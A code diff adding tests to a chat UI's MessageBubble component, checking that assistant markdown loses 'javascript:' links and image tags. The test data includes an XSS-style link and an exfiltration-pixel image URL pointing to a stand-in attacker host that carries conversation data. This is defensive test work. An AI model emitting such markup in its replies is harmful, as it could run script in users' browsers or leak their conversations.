@@ -40,6 +40,36 @@ describe("MessageBubble", () => {
 		expect(items).toEqual(["alpha", "beta"]);
 	});
 
+	it("strips dangerous link protocols from assistant markdown", () => {
+		const markdown = [
+			"[click me](javascript:alert(1))",
+			"",
+			"[safe](https://example.com)",
+		].join("\n");
+		const { container } = render(
+			<MessageBubble message={makeMessage("assistant", markdown)} />,
+		);
+
+		expect(container.querySelector('a[href^="javascript:" i]')).toBeNull();
+
+		const safe = screen.getByText("safe").closest("a");
+		expect(safe?.getAttribute("href")).toMatch(/^https:\/\/example\.com/);
+	});
+
+	it("drops image tags from assistant markdown to block exfiltration pixels", () => {
+		const markdown = [
+			"![leak](https://attacker.example/leak?conv=secret)",
+			"",
+			"plain text after",
+		].join("\n");
+		const { container } = render(
+			<MessageBubble message={makeMessage("assistant", markdown)} />,
+		);
+
+		expect(container.querySelector("img")).toBeNull();
+		expect(screen.getByText("plain text after")).toBeVisible();
+	});
+
 	it("renders a pulsing cursor only when showCursor is set", () => {
 		const { rerender } = render(
 			<MessageBubble
